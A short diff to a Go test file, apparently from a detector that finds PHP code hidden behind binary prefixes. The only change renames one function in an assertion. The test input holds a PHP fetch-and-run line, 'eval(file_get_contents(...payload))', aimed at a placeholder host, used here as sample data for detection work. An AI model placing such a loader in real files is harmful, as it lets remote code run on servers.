@@ -22,7 +22,7 @@ func TestPHPAfterBinaryPrefixIsAnalyzed(t *testing.T) {
 		for _, tag := range []string{"<?php ", "<?PHP ", "<? ", "<?= "} {
 			t.Run(name+"/"+tag, func(t *testing.T) {
 				src := []byte(prefix + tag + "eval(file_get_contents('https://example.invalid/payload')); ?>")
-				if !isCandidate(src) {
+				if !IsCandidate(src) {
 					t.Error("binary prefix hid a PHP candidate")
 				}
 				if !MayBePHPSource(src) {
